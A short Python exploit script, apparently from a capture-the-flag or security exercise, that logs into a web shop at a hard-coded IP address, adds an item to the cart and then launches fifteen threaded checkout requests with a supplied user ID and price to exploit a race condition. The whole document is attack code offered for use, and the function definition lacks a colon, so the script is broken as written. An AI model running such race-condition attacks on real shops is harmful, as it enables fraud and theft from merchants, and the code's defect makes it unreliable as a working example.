#!/usr/bin/env python3
import time
import requests
import threading

target = "34.87.154.236"

request = requests.Session()
url1 = 'http://%s/login.php'%(target)
url2 = 'http://%s/cart.php'%(target)
url3 = 'http://%s/additem.php'%(target)
url4 = 'http://%s/checkout.php'%(target)

payload1 = {
    'email': 'a@a.com',
    'password': 'a'
}
payload2 = {
    'userid': '645',
    'sum_price': '399'
}
payload3 = {
    'item_id': 'A00000001',
    'item_price': '399'
}

def send_racecondition(url4, data_input)
    req = requests.Session()
    req.post(url1, payload1)
    return req.post(url4, data_input)

s1 = request.post(url1, payload1)
s2 = request.post(url3, payload3)

for i in range(15):
    time.sleep(0.1)
    threading.Thread(target=send_racecondition, args=(url4, payload2)).start()